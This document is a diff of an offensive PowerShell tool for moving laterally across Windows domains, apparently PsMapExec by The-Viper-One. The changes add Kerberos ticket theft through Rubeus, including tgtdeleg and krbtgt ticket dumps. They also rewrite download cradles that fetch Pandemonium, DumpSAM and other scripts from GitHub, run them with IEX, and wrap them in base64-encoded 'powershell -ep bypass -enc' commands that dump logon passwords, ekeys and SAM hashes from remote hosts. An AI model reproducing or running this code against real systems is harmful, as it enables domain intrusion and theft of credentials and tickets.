@@ -70,7 +70,7 @@ Write-Output $Banner
 Write-Host "Github  : " -ForegroundColor "Yellow" -NoNewline
 Write-Host "https://github.com/The-Viper-One"
 Write-Host "Version : " -ForegroundColor "Yellow" -NoNewline
-Write-Host "0.0.2"
+Write-Host "0.0.4"
 Write-Host
 
 
@@ -134,7 +134,7 @@ $PowerViewLoaded = Get-Command -Name "Get-DomainComputer" -ErrorAction "Silently
 $InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyContinue"
 
 ###################### External Script Varibles ######################
-
+#IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Mongoose.ps1")
 $MongooseURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Mongoose.ps1"
 $RubeusURL = "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1"
 $DumpSAMURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/DumpSAM.ps1"
@@ -229,7 +229,7 @@ $CheckAdmin = "([Security.Principal.WindowsPrincipal] [Security.Principal.Window
 ######### Target acquisition  Single Domain #########
 
 if ($Targets -ne "") {
-    if ($PowerViewLoaded.Name -ne "Get-DomainComputer"){IEX (IWR -UseBasicParsing "$PowerviewURL")}
+    if ($PowerViewLoaded.Name -ne "Get-DomainComputer"){IEX(New-Object System.Net.WebClient).DownloadString("$PowerviewURL")}
 }
 
 if ($Targets -eq "Workstations") {
@@ -293,6 +293,13 @@ foreach ($DomainAdmin in $DomainAdmins){
     }
 }
 
+$DomainUser = Get-DomainUser -Domain $Domain -Identity $Username
+if (!$DomainUser){
+        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Specified username is not a valid domain user"
+        return
+}
+
 
 ######### Load Rubeus #########
 if ($InvokeRubeusLoaded.Name -ne "Invoke-Rubeus"){
@@ -350,9 +357,42 @@ IF ($GenRelayList){Set-Variable -Name "CurrentUser" -Value $True}
 
 # if the switch "CurrentUser" has not been set to $True then use Rubeus to store the current users ticket
 IF (!$CurrentUser){
-IF ($Method -ne "RDP" -and $SourceDomain -eq "") {
+IF ($Method -ne "RDP") {
+    try {
+
     $Ticket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
-    $OriginalUserTicket = $Ticket.Substring($Ticket.IndexOf('doI')).Trim()
+    $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+}
+
+Catch {
+
+try{
+Write-Host "Attempting alternate method for ticket retrieval" -ForegroundColor "Yellow"
+ 
+ IF (!$CheckAdmin){
+
+ Write-Host "Shell is not high integrity" -ForegroundColor "Yellow"
+ $Ticket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
+ $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+    
+    }
+
+IF ($CheckAdmin){
+ 
+ Write-Host "Shell is high integrity" -ForegroundColor "Yellow"
+ $Ticket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
+ $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
+        }
+    }
+
+Catch {
+
+    Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Yellow"
+    return
+
+    }
+ 
+ }
 
 
     # Check if Password or Hash has been provided
@@ -389,28 +429,28 @@ IF ($Method -ne "RDP" -and $SourceDomain -eq "") {
 ######### Module / Commands  #########
 
 if ($Module -eq "Tickets"){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX (IWR -UseBasicParsing $MongooseURL)}catch{};IEX (IWR -UseBasicParsing $PandemoniumURL);Invoke-Pandemonium -Command ""tickets"""
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{};IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
 # LogonPasswords
 elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX (IWR -UseBasicParsing $MongooseURL)}catch{} ; IEX (IWR -UseBasicParsing $PandemoniumURL);Invoke-Pandemonium -Command ""dump"""
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
 # eKeys
 elseif ($Module -eq "ekeys"){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX (IWR -UseBasicParsing $MongooseURL)}catch{} ;IEX (IWR -UseBasicParsing $PandemoniumURL);Invoke-Pandemonium -Command ""ekeys"""
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
 # SAM
 elseif ($Module -eq "SAM"){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX (IWR -UseBasicParsing $MongooseURL)}catch{} ;IEX (IWR -UseBasicParsing $DumpSAMURL)"
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {IEX(New-Object System.Net.WebClient).DownloadString(""$MongooseURL"")}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$DumpSAMURL"")"
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
@@ -575,7 +615,6 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
              }
              
              elseif ($Module -eq "ekeys" -and $Option -ne "Parse"){
-             Write-host $ComputerName; Write-host "Test"
              $result | Write-Host
              $result | Out-File -FilePath "$eKeys\$ComputerName-eKeys.txt" -Encoding "ASCII"
              }
@@ -2467,17 +2506,19 @@ Function Parse-eKeys {
 
 # Function - Restore Ticket
 Function RestoreTicket{
-
-IF (!$CurrentUser -or !$GenRelayList){
-klist purge | Out-Null
-Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+if (!$CurrentUser) {
+    if (!$GenRelayList){
+    klist purge | Out-Null
+    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
+        
+        }
     }
 }
 
 
 ########## Execute defined methods ##########
 
-IF ($Method -eq "WinRM"){Method-WinRM ; SAM ; Parse-LogonPasswords ; Parse-eKeys ; RestoreTicket}
+IF ($Method -eq "WinRM"){Method-WinRM}
 IF ($Method -eq "MSSQL"){Method-MSSQL}
 IF ($Method -eq "Psexec"){Method-PsExec}
 IF ($Method -eq "WMI"){Method-WMIexec}
@@ -2499,6 +2540,7 @@ Write-Host "Script finished at $Time"
 Get-Variable | Remove-Variable -ErrorAction SilentlyContinue
 
 }
+
 
 
 
